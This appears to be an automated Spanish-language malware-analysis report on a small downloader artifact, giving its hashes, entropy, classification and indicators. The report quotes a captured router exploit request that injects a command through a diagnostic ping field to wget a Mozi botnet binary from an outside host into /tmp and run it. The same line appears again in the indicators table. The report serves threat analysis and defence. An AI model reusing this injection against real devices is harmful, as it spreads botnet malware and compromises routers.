# 🧬 Payload Analysis

`df9035bf9e75bad902d8deb7498cf462dfde07c59125f54402e2f84716adfdaa`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 138 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://202.47.56.XXX:59235/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:25:57.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `df9035bf9e75bad902d8deb7498cf462dfde07c59125f54402e2f84716adfdaa`
- **MD5:** `f5e29e2501021107b581451177c6efb4`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.14 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://202.47.56.XXX:59235/Mozi.m+-O+- | strings |
| ip | 202.47.56.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | df9035bf9e75bad902d8deb7498cf462dfde07c59125f54402e2f84716adfdaa | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
